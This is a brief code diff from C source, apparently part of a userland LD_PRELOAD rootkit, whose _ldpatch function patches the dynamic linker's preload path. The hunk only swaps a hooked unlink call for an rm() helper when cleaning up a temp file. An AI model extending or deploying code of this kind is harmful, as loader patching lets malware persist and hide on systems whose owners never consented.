@@ -55,8 +55,7 @@ int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
     fcloser(2, ofp, nfp);
 
     if(count != LEN_OLD_PRELOAD){  // oldpreload was not found.
-        hook(CUNLINK);             // remove tmp file.
-        call(CUNLINK, tmppath);
+        rm(tmppath);               // remove tmp file.
         return -2;  // this is worth noting.
     }
 
